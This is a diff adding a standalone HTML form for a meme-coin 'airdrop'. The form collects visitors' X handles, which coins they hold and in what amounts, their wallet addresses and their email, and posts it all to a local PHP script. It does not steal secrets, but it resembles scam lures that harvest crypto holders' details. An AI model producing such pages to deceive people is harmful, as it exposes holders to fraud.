@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ZoZo Meme Airdrop</title>
+  <style>
+    body {
+      background: #f0f2f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    form {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      max-width: 500px;
+      width: 100%;
+    }
+    label {
+      font-weight: bold;
+      margin-top: 15px;
+      display: block;
+    }
+    input[type="text"], input[type="email"], select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    .radio-group {
+      margin-top: 10px;
+    }
+    .radio-group label {
+      font-weight: normal;
+      margin-right: 20px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px;
+      width: 100%;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+    .message {
+      background: #d4edda;
+      color: #155724;
+      padding: 20px;
+      text-align: center;
+      margin-bottom: 20px;
+      border-radius: 10px;
+      display: none;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+
+  <form id="airdropForm">
+    <h2>ZoZo Special Support Airdrop for Meme Coin Holders</h2>
+
+
+    <label>Are you a ZoZo Twitter (X) member?</label>
+    <div class="radio-group">
+      <label><input type="radio" name="twitter_member" value="yes" required> Yes</label>
+      <label><input type="radio" name="twitter_member" value="no"> No</label>
+    </div>
+
+    <label>Your Twitter (X) Handle</label>
+    <input type="text" name="twitter_handle" placeholder="@yourhandle" required>
+
+    <label>Which eligible meme coins do you hold?</label>
+    <input type="text" name="meme_coin" placeholder="Example: shiba, doge, pepe, floki, bonk" required>
+
+    <label>What amount of meme coins do you hold?</label>
+    <input type="text" name="coin_amount" placeholder="Example: $5, $10, $100" required>
+
+    <label>Your wallet address holding eligible meme coins</label>
+    <input type="text" name="wallet_address" placeholder="Paste wallet address here" required>
+
+    <label>Your MetaMask address to receive the airdrop <small>(If you don’t have MetaMask, enter a valid token receiving address using the official token contract: 0x7e79802Ed2a9A27b87b1fc96e8F5FD4765381a3e)</small></label>
+    <input type="text" name="metamask_address" placeholder="0x..." required>
+
+    <label>Your Email</label>
+    <input type="email" name="email" placeholder="you@example.com" required>
+
+    <button type="submit">Submit</button>
+	<div class="message" id="successMessage">
+  Thank you for supporting meme coins and ZoZo.<br>
+  After verification, your airdrop reward will be sent.<br>
+  <strong>Note:</strong> One entry per user. Attempts to abuse will result in blacklist.
+</div>
+  </form>
+
+  <script>
+    document.getElementById("airdropForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const form = e.target;
+      const data = new FormData(form);
+
+      if (data.get("twitter_member") !== "yes") {
+        alert("You must be a ZoZo Twitter (X) member to submit.");
+        return;
+      }
+
+      fetch("send1.php", {
+        method: "POST",
+        body: data
+      })
+      .then(res => res.text())
+      .then(res => {
+        document.getElementById("successMessage").style.display = "block";
+      })
+      .catch(err => {
+        alert("Error submitting form. Try again.");
+      });
+    });
+  </script>
+
+</body>
+</html>
